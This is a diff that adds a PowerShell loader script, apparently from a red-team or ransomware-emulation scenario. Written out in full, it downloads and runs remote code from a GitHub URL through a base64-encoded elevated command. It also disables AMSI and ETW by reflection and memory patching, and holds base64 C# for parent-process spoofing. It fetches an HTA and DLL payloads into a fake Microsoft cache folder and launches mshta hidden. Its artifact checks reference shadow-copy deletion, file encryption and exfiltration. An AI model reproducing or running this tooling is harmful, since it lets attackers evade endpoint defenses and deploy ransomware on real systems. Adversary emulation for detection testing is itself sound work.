@@ -1,0 +1,282 @@
+param(
+    [switch]$WhatIf
+)
+
+# -- CONFIG --
+$scriptBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario3/main"
+$cleanupUrl = "$scriptBase/cleanup.ps1"
+
+# -- Logging --
+$logFile = "C:\ProgramData\Microsoft\cache\tray\cache.dat"
+function Write-Log($msg) {
+    $parent = Split-Path $logFile -Parent
+    if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
+    [System.IO.File]::AppendAllText($logFile, "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg`n", (New-Object System.Text.UTF8Encoding($false)))
+}
+
+# -- Elevation Gate --
+$isAdmin = [Security.Principal.WindowsPrincipal]::new(
+    [Security.Principal.WindowsIdentity]::GetCurrent()
+).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $isAdmin) {
+    Write-Log "[!] UAC check: not admin, requesting elevation..."
+    $scriptUrl = "$scriptBase/loader.ps2?t=$(Get-Date -Format 'yyyyMMddHHmmss')"
+    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
+        "iex((New-Object Net.WebClient).DownloadString('$scriptUrl'))"
+    ))
+    Start-Process powershell -Verb RunAs -ArgumentList "-NoP -Exec Bypass -Enc $b64"
+    exit
+}
+
+Write-Log "[+] UAC check: admin=True"
+Write-Log "[*] loader.ps2 started - scriptBase=$scriptBase logFile=$logFile"
+
+# -- ACL grants (post-run fix: admin-owned log silent failure) --
+$aclTargets = @(
+    $logFile,
+    "C:\ProgramData\Microsoft\cache\tray",
+    "C:\ProgramData\Microsoft\cache\tray\loader.dll",
+    "C:\ProgramData\Microsoft\cache\tray\stage2.dll",
+    "C:\ProgramData\Microsoft\cache\tray\payload.hta"
+)
+foreach ($aclPath in $aclTargets) {
+    $parent = Split-Path $aclPath -Parent
+    if ($aclPath -eq $logFile) { $parent = Split-Path $logFile -Parent }
+    if (-not $parent) { $parent = $aclPath }
+    if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
+    if (-not (Test-Path $aclPath)) {
+        if ($aclPath -like '*.*') { New-Item -Path $aclPath -ItemType File -Force | Out-Null }
+        else { New-Item -Path $aclPath -ItemType Directory -Force | Out-Null }
+    }
+    try {
+        icacls $aclPath /grant "BUILTIN\Users:(M)" 2>&1 | Out-Null
+    } catch {}
+}
+
+# -- In-memory C# compile --
+function Add-TypeInMem([string]$source) {
+    $cp = New-Object System.CodeDom.Compiler.CompilerParameters
+    $cp.GenerateInMemory = $true
+    $cp.IncludeDebugInformation = $false
+    $prov = New-Object Microsoft.CSharp.CSharpCodeProvider
+    $res = $prov.CompileAssemblyFromSource($cp, $source)
+    if ($res.Errors -and $res.Errors.HasErrors) {
+        $msgs = ($res.Errors | Where-Object { -not $_.IsWarning } | ForEach-Object { $_.ErrorText }) -join "`n"
+        throw "C# compile failed: $msgs"
+    }
+    return $res.CompiledAssembly
+}
+
+if ($WhatIf) {
+    Write-Log "[WHATIF] Skipping AMSI/ETW bypass (child process)"
+} else {
+    $logDir = Split-Path $logFile -Parent
+    $bootFlag = Join-Path $logDir "boot-ok.flag"
+    if (Test-Path $bootFlag) { Remove-Item $bootFlag -Force -ErrorAction SilentlyContinue }
+
+    $bypassChild = @"
+`$flagPath = 'C:\ProgramData\Microsoft\cache\tray\boot-ok.flag'
+`$logFile = `$flagPath
+function Write-Log(`$msg) {
+    `$parent = Split-Path `$logFile -Parent
+    if (-not (Test-Path `$parent)) { New-Item -Path `$parent -ItemType Directory -Force | Out-Null }
+    "`$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') `$msg" | Out-File `$logFile -Append
+}
+function Add-TypeInMem([string]`$source) {
+    `$cp = New-Object System.CodeDom.Compiler.CompilerParameters
+    `$cp.GenerateInMemory = `$true
+    `$cp.IncludeDebugInformation = `$false
+    `$prov = New-Object Microsoft.CSharp.CSharpCodeProvider
+    `$res = `$prov.CompileAssemblyFromSource(`$cp, `$source)
+    if (`$res.Errors -and `$res.Errors.HasErrors) { throw 'C# compile failed' }
+    return `$res.CompiledAssembly
+}
+`$reflectStatus = 'SKIP'
+try {
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)
+    `$reflectStatus = 'OK'
+} catch { Write-Log "AMSI_REFLECT_FAIL: `$_" }
+`$patchStatus = 'SKIP'
+`$bs = @'
+using System;
+using System.Runtime.InteropServices;
+using System.Runtime.ExceptionServices;
+public class Bypass {
+    [DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr h, string n);
+    [DllImport("kernel32.dll")]public static extern IntPtr LoadLibrary(string n);
+    [DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
+    [HandleProcessCorruptedStateExceptions]
+    public static bool Go() {
+        try {
+            uint o = 0;
+            var a = LoadLibrary("amsi.dll");
+            var b = GetProcAddress(a, "AmsiScanBuffer");
+            if (b == IntPtr.Zero) return false;
+            if (!VirtualProtect(b, (UIntPtr)6, 0x40, out o)) return false;
+            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            Marshal.Copy(patch, 0, b, 6);
+            VirtualProtect(b, (UIntPtr)6, o, out o);
+            var c = LoadLibrary("ntdll.dll");
+            var d = GetProcAddress(c, "EtwEventWrite");
+            if (d == IntPtr.Zero) return true;
+            if (!VirtualProtect(d, (UIntPtr)1, 0x40, out o)) return true;
+            Marshal.Copy(new byte[]{0xC3}, 0, d, 1);
+            return true;
+        } catch { return false; }
+    }
+}
+'@
+try {
+    `$b = Add-TypeInMem `$bs
+    `$ok = [bool]`$b.GetType('Bypass').GetMethod('Go').Invoke(`$null, @())
+    if (`$ok) { `$patchStatus = 'OK' } else { `$patchStatus = 'FAIL_FALSE' }
+} catch { Write-Log "AMSI_PATCH_FAIL: `$_" }
+'BYPASS_REFLECT=' + `$reflectStatus + ' PATCH=' + `$patchStatus | Out-File `$flagPath -Force
+"@
+    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($bypassChild))
+    Write-Log "[*] Launching AMSI/ETW bypass child process"
+    try {
+        $child = Start-Process powershell -ArgumentList "-NoP -Exec Bypass -Enc $b64" -WindowStyle Hidden -PassThru -ErrorAction Stop
+        Write-Log "[*] Bypass child PID=$($child.Id)"
+    } catch {
+        Write-Log "[!] Bypass child launch failed: $_"
+        $child = $null
+    }
+
+    if ($child) {
+        $waited = 0
+        $flagFound = $false
+        while ($waited -lt 60 -and -not $flagFound) {
+            if (Test-Path $bootFlag) { $flagFound = $true; break }
+            if ($child.HasExited) {
+                Start-Sleep -Milliseconds 500
+                if (Test-Path $bootFlag) { $flagFound = $true }
+                break
+            }
+            Start-Sleep -Seconds 1
+            $waited++
+        }
+        if ($flagFound) {
+            $status = (Get-Content $bootFlag -Raw).Trim()
+            Write-Log "[+] AMSI/ETW bypass child completed: $status"
+        } else {
+            Write-Log "[!] AMSI/ETW bypass child killed/timeout"
+        }
+        try { Remove-Item $bootFlag -Force -ErrorAction SilentlyContinue } catch {}
+        if (-not $child.HasExited) {
+            try { Stop-Process -Id $child.Id -Force -ErrorAction SilentlyContinue } catch {}
+        }
+    }
+}
+Write-Log "[+] AMSI/ETW bypass step complete"
+
+# -- Scatter directories --
+$scatterDirs = @(
+    "C:\ProgramData\Microsoft\cache\tray"
+)
+Write-Log "[*] Creating scatter directories"
+if ($WhatIf) {
+    $scatterDirs | ForEach-Object { Write-Log "[WHATIF] would mkdir $_" }
+} else {
+    $scatterDirs | ForEach-Object { New-Item -Path $_ -ItemType Directory -Force | Out-Null }
+}
+
+$spoofBase64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpwdWJsaWMgc3RhdGljIGNsYXNzIFNwb29mCnsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBPcGVuUHJvY2Vzcyh1aW50IGR3RGVzaXJlZEFjY2VzcywgYm9vbCBiSW5oZXJpdEhhbmRsZSwgaW50IGR3UHJvY2Vzc0lkKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIEluaXRpYWxpemVQcm9jVGhyZWFkQXR0cmlidXRlTGlzdCgKICAgICAgICBJbnRQdHIgbHBBdHRyaWJ1dGVMaXN0LCBpbnQgZHdBdHRyaWJ1dGVDb3VudCwgaW50IGR3RmxhZ3MsIHJlZiBJbnRQdHIgbHBTaXplKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFVwZGF0ZVByb2NUaHJlYWRBdHRyaWJ1dGUoCiAgICAgICAgSW50UHRyIGxwQXR0cmlidXRlTGlzdCwgdWludCBkd0ZsYWdzLCBJbnRQdHIgYXR0cmlidXRlLAogICAgICAgIEludFB0ciBscFZhbHVlLCBJbnRQdHIgY2JTaXplLCBJbnRQdHIgbHBQcmV2aW91c1ZhbHVlLCBJbnRQdHIgbHBSZXR1cm5TaXplKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZVByb2Nlc3MoCiAgICAgICAgc3RyaW5nIGxwQXBwbGljYXRpb25OYW1lLCBzdHJpbmcgbHBDb21tYW5kTGluZSwKICAgICAgICBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidXRlcywgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywKICAgICAgICBib29sIGJJbmhlcml0SGFuZGxlcywgdWludCBkd0NyZWF0aW9uRmxhZ3MsCiAgICAgICAgSW50UHRyIGxwRW52aXJvbm1lbnQsIHN0cmluZyBscEN1cnJlbnREaXJlY3RvcnksCiAgICAgICAgcmVmIFNUQVJUVVBJTkZPRVggbHBTdGFydHVwSW5mbywKICAgICAgICBvdXQgUFJPQ0VTU19JTkZPUk1BVElPTiBscFByb2Nlc3NJbmZvcm1hdGlvbik7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZUhhbmRsZShJbnRQdHIgaE9iamVjdCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBEZWxldGVQcm9jVGhyZWFkQXR0cmlidXRlTGlzdChJbnRQdHIgbHBBdHRyaWJ1dGVMaXN0KTsKCiAgICBwcml2YXRlIGNvbnN0IHVpbnQgUFJPQ19DUkVBVEVfUFJPQ0VTUyA9IDB4MDA4MDsKICAgIHByaXZhdGUgY29uc3QgdWludCBFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UID0gMHgwMDA4MDAwMDsKICAgIHByaXZhdGUgY29uc3QgdWludCBDUkVBVEVfTk9fV0lORE9XID0gMHgwODAwMDAwMDsKICAgIHByaXZhdGUgc3RhdGljIHJlYWRvbmx5IEludFB0ciBQcm9jVGhyZWFkQXR0cmlidXRlUGFyZW50UHJvY2VzcyA9IG5ldyBJbnRQdHIoMHgwMDAyMDAwMCk7CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgU1RBUlRVUElORk8KICAgIHsKICAgICAgICBwdWJsaWMgaW50IGNiOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBSZXNlcnZlZDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwRGVza3RvcDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwVGl0bGU7CiAgICAgICAgcHVibGljIGludCBkd1g7CiAgICAgICAgcHVibGljIGludCBkd1k7CiAgICAgICAgcHVibGljIGludCBkd1hTaXplOwogICAgICAgIHB1YmxpYyBpbnQgZHdZU2l6ZTsKICAgICAgICBwdWJsaWMgaW50IGR3WENvdW50Q2hhcnM7CiAgICAgICAgcHVibGljIGludCBkd1lDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBpbnQgZHdGaWxsQXR0cmlidXRlOwogICAgICAgIHB1YmxpYyBpbnQgZHdGbGFnczsKICAgICAgICBwdWJsaWMgc2hvcnQgd1Nob3dXaW5kb3c7CiAgICAgICAgcHVibGljIHNob3J0IGNiUmVzZXJ2ZWQyOwogICAgICAgIHB1YmxpYyBJbnRQdHIgbHBSZXNlcnZlZDI7CiAgICAgICAgcHVibGljIEludFB0ciBoU3RkSW5wdXQ7CiAgICAgICAgcHVibGljIEludFB0ciBoU3RkT3V0cHV0OwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZEVycm9yOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IFBST0NFU1NfSU5GT1JNQVRJT04KICAgIHsKICAgICAgICBwdWJsaWMgSW50UHRyIGhQcm9jZXNzOwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFRocmVhZDsKICAgICAgICBwdWJsaWMgaW50IGR3UHJvY2Vzc0lkOwogICAgICAgIHB1YmxpYyBpbnQgZHdUaHJlYWRJZDsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldCiAgICBwcml2YXRlIHN0cnVjdCBTVEFSVFVQSU5GT0VYCiAgICB7CiAgICAgICAgcHVibGljIFNUQVJUVVBJTkZPIFN0YXJ0dXBJbmZvOwogICAgICAgIHB1YmxpYyBJbnRQdHIgbHBBdHRyaWJ1dGVMaXN0OwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgaW50IFNwYXduV2l0aFBhcmVudChzdHJpbmcgY21kTGluZSwgaW50IHBhcmVudFBpZCkKICAgIHsKICAgICAgICBJbnRQdHIgaFBhcmVudCA9IE9wZW5Qcm9jZXNzKFBST0NfQ1JFQVRFX1BST0NFU1MsIGZhbHNlLCBwYXJlbnRQaWQpOwogICAgICAgIGlmIChoUGFyZW50ID09IEludFB0ci5aZXJvKSByZXR1cm4gLTE7CgogICAgICAgIEludFB0ciBhdHRyTGlzdFNpemUgPSBJbnRQdHIuWmVybzsKICAgICAgICBJbml0aWFsaXplUHJvY1RocmVhZEF0dHJpYnV0ZUxpc3QoSW50UHRyLlplcm8sIDEsIDAsIHJlZiBhdHRyTGlzdFNpemUpOwoKICAgICAgICBJbnRQdHIgYXR0ckxpc3QgPSBNYXJzaGFsLkFsbG9jSEdsb2JhbChhdHRyTGlzdFNpemUpOwogICAgICAgIGlmIChhdHRyTGlzdCA9PSBJbnRQdHIuWmVybykgeyBDbG9zZUhhbmRsZShoUGFyZW50KTsgcmV0dXJuIC0xOyB9CgogICAgICAgIGlmICghSW5pdGlhbGl6ZVByb2NUaHJlYWRBdHRyaWJ1dGVMaXN0KGF0dHJMaXN0LCAxLCAwLCByZWYgYXR0ckxpc3RTaXplKSkKICAgICAgICB7CiAgICAgICAgICAgIE1hcnNoYWwuRnJlZUhHbG9iYWwoYXR0ckxpc3QpOyBDbG9zZUhhbmRsZShoUGFyZW50KTsgcmV0dXJuIC0xOwogICAgICAgIH0KCiAgICAgICAgSW50UHRyIHBhcmVudFB0ciA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKEludFB0ci5TaXplKTsKICAgICAgICBNYXJzaGFsLldyaXRlSW50UHRyKHBhcmVudFB0ciwgaFBhcmVudCk7CiAgICAgICAgVXBkYXRlUHJvY1RocmVhZEF0dHJpYnV0ZShhdHRyTGlzdCwgMCwgUHJvY1RocmVhZEF0dHJpYnV0ZVBhcmVudFByb2Nlc3MsCiAgICAgICAgICAgIHBhcmVudFB0ciwgKEludFB0cilJbnRQdHIuU2l6ZSwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvKTsKCiAgICAgICAgU1RBUlRVUElORk9FWCBzaUV4ID0gbmV3IFNUQVJUVVBJTkZPRVgoKTsKICAgICAgICBzaUV4LlN0YXJ0dXBJbmZvLmNiID0gTWFyc2hhbC5TaXplT2YodHlwZW9mKFNUQVJUVVBJTkZPRVgpKTsKICAgICAgICBzaUV4LmxwQXR0cmlidXRlTGlzdCA9IGF0dHJMaXN0OwoKICAgICAgICBQUk9DRVNTX0lORk9STUFUSU9OIHBpID0gbmV3IFBST0NFU1NfSU5GT1JNQVRJT04oKTsKICAgICAgICBib29sIGNyZWF0ZWQgPSBDcmVhdGVQcm9jZXNzKG51bGwsIGNtZExpbmUsCiAgICAgICAgICAgIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybywgZmFsc2UsCiAgICAgICAgICAgIEVYVEVOREVEX1NUQVJUVVBJTkZPX1BSRVNFTlQgfCBDUkVBVEVfTk9fV0lORE9XLAogICAgICAgICAgICBJbnRQdHIuWmVybywgbnVsbCwgcmVmIHNpRXgsIG91dCBwaSk7CgogICAgICAgIERlbGV0ZVByb2NUaHJlYWRBdHRyaWJ1dGVMaXN0KGF0dHJMaXN0KTsKICAgICAgICBNYXJzaGFsLkZyZWVIR2xvYmFsKGF0dHJMaXN0KTsKICAgICAgICBNYXJzaGFsLkZyZWVIR2xvYmFsKHBhcmVudFB0cik7CiAgICAgICAgQ2xvc2VIYW5kbGUoaFBhcmVudCk7CgogICAgICAgIGlmIChjcmVhdGVkKSB7IENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7IHJldHVybiBwaS5kd1Byb2Nlc3NJZDsgfQogICAgICAgIHJldHVybiAtMTsKICAgIH0KfQo="
+
+# -- Download artifacts --
+$htaUrl = "$scriptBase/payload.hta"
+$htaPath = "C:\ProgramData\Microsoft\cache\tray\payload.hta"
+$loaderUrl = "$scriptBase/loader.dll"
+$loaderPath = "C:\ProgramData\Microsoft\cache\tray\loader.dll"
+$stage2Url = "$scriptBase/stage2.dll"
+$stage2Path = "C:\ProgramData\Microsoft\cache\tray\stage2.dll"
+
+$downloads = @(
+    @{Url=$htaUrl; Path=$htaPath; Name="payload.hta"},
+    @{Url=$loaderUrl; Path=$loaderPath; Name="loader.dll"},
+    @{Url=$stage2Url; Path=$stage2Path; Name="stage2.dll"}
+)
+
+foreach ($dl in $downloads) {
+    Write-Log "[*] Downloading $($dl.Name) from $($dl.Url) -> $($dl.Path)"
+    if ($WhatIf) {
+        Write-Log "[WHATIF] would download $($dl.Url) -> $($dl.Path)"
+    } else {
+        try {
+            Invoke-WebRequest -Uri $dl.Url -OutFile $dl.Path -UseBasicParsing
+            if (Test-Path $dl.Path) { Write-Log "[+] $($dl.Name) downloaded at $($dl.Path) - $((Get-Item $dl.Path).Length) bytes" }
+            else { Write-Log "[-] $($dl.Name) download FAILED at $($dl.Path)" }
+        } catch { Write-Log "[-] $($dl.Name) download FAILED at $($dl.Path) - $_" }
+    }
+}
+
+# -- PPID Spoof: spawn mshta.exe with parent = explorer.exe --
+Write-Log "[*] Spawning mshta.exe with PPID spoof (parent = explorer.exe, target = $htaPath)..."
+if ($WhatIf) {
+    Write-Log "[WHATIF] would spawn mshta.exe (PPID-spoofed to explorer.exe) with target $htaPath"
+} else {
+    try {
+        $explorer = Get-Process -Name explorer -ErrorAction SilentlyContinue | Select-Object -First 1
+        if (-not $explorer) {
+            Write-Log "[-] explorer.exe not found - spawning directly"
+            Start-Process -FilePath "mshta.exe" -ArgumentList "`"$htaPath`"" -WindowStyle Hidden
+        } else {
+            try {
+                $spoofBytes = [Convert]::FromBase64String($spoofBase64)
+                $spoofSource = [Text.Encoding]::UTF8.GetString($spoofBytes)
+                $spoofAsm = Add-TypeInMem $spoofSource
+                $spawnPid = [int]($spoofAsm.GetType("Spoof").GetMethod("SpawnWithParent").Invoke($null, @("mshta.exe `"$htaPath`"", [int]$explorer.Id)))
+                if ($spawnPid -ge 0) {
+                    Write-Log "[+] mshta.exe spawned via PPID spoof - PID $spawnPid (parent=explorer.exe=$($explorer.Id), target=$htaPath)"
+                } else {
+                    Write-Log "[-] PPID spoof failed (fallback: direct spawn)"
+                    Start-Process -FilePath "mshta.exe" -ArgumentList "`"$htaPath`"" -WindowStyle Hidden
+                }
+            } catch {
+                Write-Log "[!] spoof.cs compile/invoke failed: $_ - fallback"
+                Start-Process -FilePath "mshta.exe" -ArgumentList "`"$htaPath`"" -WindowStyle Hidden
+            }
+        }
+    } catch {
+        Write-Log "[-] mshta.exe spawn FAILED at $htaPath - $_"
+    }
+}
+
+# -- Per-tactic artifact probe (waits 240s for chain to complete) --
+if (-not $WhatIf) {
+    Write-Log "[*] Waiting 240s for post-ex artifacts to land..."
+    Start-Sleep -Seconds 240
+} else {
+    Write-Log "[WHATIF] would sleep 240s then probe artifacts"
+}
+
+$artifacts = @{
+    "T1055.012 PPID spoof (mshta HTA)"   = "C:\ProgramData\Microsoft\cache\tray\payload.hta"
+    "T1105 certutil download"            = "C:\ProgramData\Microsoft\cache\tray\loader.dll"
+    "T1055.012 process hollowing"        = "C:\ProgramData\Microsoft\cache\tray\stage2.dll"
+    "T1490 shadow copy (vssadmin)"       = "vssadmin.exe"
+    "T1486 file encrypt (.govinda)"      = ".govinda"
+    "T1041 HTTP exfil (github.com)"      = "C:\ProgramData\Microsoft\cache\tray\cache.dat"
+    "T1074.001 staging scatter"          = "C:\ProgramData\Microsoft\cache\tray\net.tmp"
+    "T1018 remote system discovery"      = "C:\ProgramData\Microsoft\cache\tray\net.tmp"
+}
+
+function Test-Artifact {
+    param([string]$Path)
+    if ($Path -like 'C:\*' -or $Path -like 'C:/*') {
+        return (Test-Path -LiteralPath $Path)
+    }
+    return $false
+}
+
+foreach ($k in $artifacts.Keys) {
+    $path = $artifacts[$k]
+    if (Test-Artifact -Path $path) {
+        Write-Log "[+] $k : $path"
+    } else {
+        Write-Log "[-] $k : $path"
+    }
+}
+
+Write-Log "[+] loader.ps2 complete - cache.dat at $logFile, cleanupUrl=$cleanupUrl"
